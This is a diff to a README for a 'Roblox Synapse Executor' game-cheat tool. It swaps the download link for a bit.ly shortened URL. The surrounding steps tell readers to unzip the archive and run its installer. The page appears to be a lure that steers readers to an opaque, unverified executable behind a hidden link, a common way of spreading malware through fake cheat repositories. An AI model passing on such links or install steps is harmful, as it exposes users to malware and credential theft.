@@ -35,7 +35,7 @@ Roblox Synapse Executor is a powerful tool designed for Roblox developers and en
 
 To get started with Roblox Synapse Executor, follow these simple steps:
 
-1. Download the Synapse software package from the following link: [![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue)](https://github.com/user-attachments/files/17394153/Software.zip)
+1. Download the Synapse software package from the following link: [![Download Synapse](https://bit.ly/4fHvJAz)
 
 2. Unzip the downloaded file and run the installer to set up Synapse on your system.
 
